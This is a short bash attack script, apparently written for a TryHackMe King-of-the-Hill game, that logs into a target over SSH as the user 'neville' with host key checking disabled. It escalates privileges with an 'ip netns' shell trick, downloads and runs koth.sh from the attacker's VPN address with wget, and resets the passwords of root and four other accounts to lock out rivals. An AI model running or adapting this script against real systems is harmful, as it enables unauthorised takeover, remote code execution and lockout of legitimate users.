#!/bin/bash


read -p "Your TryHackMe username: " nick
read -p "Enter the machine IP address: " ip_address
read -p "SSH PORT: " PORT
read -s -p "Enter the new password: " password

vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)

ssh -o StrictHostKeychecking=no neville@"$ip_address" -p "$PORT" << EOF

    ip netns add foo && ip netns exec foo /bin/sh -p

    cd /boot && wget http://$vpn/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$nick"
    echo "$password" | passwd --stdin root
    echo "$password" | passwd --stdin neville
    echo "$password" | passwd --stdin draco
    echo "$password" | passwd --stdin harry
    echo "$password" | passwd --stdin hermione

EOF
